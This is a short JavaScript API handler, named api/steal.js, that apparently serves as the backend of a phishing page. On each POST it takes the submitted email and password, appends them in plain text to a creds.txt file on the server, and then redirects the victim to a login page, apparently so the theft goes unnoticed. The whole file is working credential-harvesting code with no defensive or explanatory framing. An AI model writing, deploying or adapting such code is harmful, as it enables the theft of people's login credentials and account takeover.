// api/steal.js
import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body;

    const log = `Email: ${email} | Password: ${password}\n`;
    const filePath = path.join(process.cwd(), 'creds.txt');

    fs.appendFile(filePath, log, (err) => {
      if (err) {
        console.error(err);
        return res.status(500).json({ message: 'Server error' });
      }
      res.status(302).redirect('https://example.com/login');
    });
  } else {
    res.status(405).send('Method not allowed');
  }
}
